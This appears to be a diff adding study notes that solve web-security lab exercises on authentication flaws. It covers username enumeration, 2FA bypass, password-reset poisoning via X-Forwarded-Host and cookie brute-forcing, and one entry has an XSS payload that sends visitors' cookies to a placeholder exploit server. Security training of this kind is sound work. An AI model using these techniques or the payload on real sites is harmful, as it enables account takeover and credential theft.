@@ -1,0 +1,162 @@
+__________________________________________________________________________________________
+
+
+Username enumeration via different responses:
+
+WEAKNESS:
+Username and password can be brute-forced, msg shows validity of username or password.
+
+SOLUTION:
+Brute-force username with wordlist, a valid victim username will show different response.
+Brute-force password with wordlist, done.
+
+__________________________________________________________________________________________
+
+
+2FA simple bypass:
+
+WEAKNESS:
+2FA verification skippable.
+
+SOLUTION:
+After login, skip 2FA verification page by going to account page diectly.
+
+__________________________________________________________________________________________
+
+
+Password reset broken logic:
+
+WEAKNESS:
+temp-forgot-password-token is useless.
+
+SOLUTION:
+Remove the value of temp-forgot-password-token, replace victim username and new password, done
+
+__________________________________________________________________________________________
+
+
+Username enumeration via subtly different responses:
+
+WEAKNESS:
+Username and password can be brute-forced
+
+SOLUTION:
+Brute-force username with wordlist, a valid victim username will show slightly different response.
+Brute-force password with wordlist, done.
+
+__________________________________________________________________________________________
+
+
+Username enumeration via response timing:
+
+WEAKNESS:
+Blocks multiple attempt's IP, but different validity of username has different response time.
+
+SOLUTION:
+Add the X-Forwarded-For header with different value for every request/attempt.
+Brute-force username with wordlist, valid username will have different response time.
+Brute-force password with wordlist, done.
+
+__________________________________________________________________________________________
+
+
+Broken brute-force protection, IP block:
+
+WEAKNESS:
+Third incorrect login attempt will block our IP, but a correct attempt can reset the counter.
+
+SOLUTION:
+Set Maximum concurrent requests to 1 in Resource pool.
+Customize the brute-force with correct attempt on every third attempt, done.
+
+__________________________________________________________________________________________
+
+
+Username enumeration via account lock:
+
+WEAKNESS:
+Multiple incorrect login attempt will trigger lock, but still can brute-force.
+
+SOULTION:
+Brute-force every username with 3~5 password to trigger lock, notice a valid username has different response.
+Brute-force password with wordlist, notice a correct password has different response, done.
+
+__________________________________________________________________________________________
+
+
+2FA broken logic:
+
+WEAKNESS:
+GET/POST 2FA verification request can be reused and 2FA code can be brute-forced.
+
+SOLUTION:
+Resend a valid GET 2FA verification request with victim's username, a 2FA code will be sent to victim's email.
+Resend valid POST 2FA verification requests with victim's username and random 2FA codes, done.
+(Burp Suite Community takes forever to solved, need Professional version)
+
+__________________________________________________________________________________________
+
+
+Brute-forcing a stay-logged-in cookie:
+
+WEAKNESS:
+stay-logged-in cookie is vulnerable to brute-force.
+
+SOLUTION:
+Investigate a valid stay-logged-in cookie, turns out it's base64(username + ':' + md5 hash of password).
+Brute-force GET /my-account?id=victim request with stay-logged-in=base64(victim + ':' + md5 hash of wordlist).
+A valid stay-logged-in cookie will show different response.
+
+__________________________________________________________________________________________
+
+
+Offline password cracking:
+
+WEAKNESS:
+Post comment function is vulnerable to XSS.
+
+SOLUTION:
+Investigate a valid stay-logged-in cookie, turns out it's base64(username + ':' + md5 hash of password).
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+Above comment will send every comment viewer's stay-logged-in cookie to YOUR-EXPLOIT-SERVER.
+Decode their cookie and get the username and password.
+
+__________________________________________________________________________________________
+
+
+Password reset poisoning via middleware:
+
+WEAKNESS:
+A victim carelessly clicks on any link he receives in his email, and X-Forwarded-Host header is blindly trusted.
+
+SOLUTION:
+Modify a valid POST /forgot-password request with victim's username.
+Add X-Forwarded-Host header with the value YOUR-EXPLOIT-SERVER-ID.exploit-server.net, then send.
+When victim clicks the link in his email, YOUR-EXPLOIT-SERVER receives the request with password reset token.
+Replace the token on a valid reset link in email, access the page and change the victim's password.
+
+__________________________________________________________________________________________
+
+
+Password brute-force via password change:
+
+WEAKNESS:
+Any user's password changing request can be sent by any user and while changing password:
+wrong password + two same new passwords = account locked
+wrong password + two different new passwords = msg new passwords do not match.
+
+SOLUTION:
+Modify a valid POST change-password request with victim's username.
+Brute-force current password with wordlist and two different new passwords to avoid lock.
+The response with "New passwords do not match" shows correct password.
+
+__________________________________________________________________________________________
+
+
+Appendix:
+
+X-Forwarded-Host header: A non-standard HTTP header used in web development to indicate the original Host requested by the client, especially when the request passes through a reverse proxy or load balancer.
+Use Cases
+- Reconstructing the original URL: Useful for generating absolute URLs in password reset links, redirects, or canonical tags.
+- Multi-tenant apps: Determine which domain the user accessed.
+- Logging and analytics: Track which hostnames are being used.
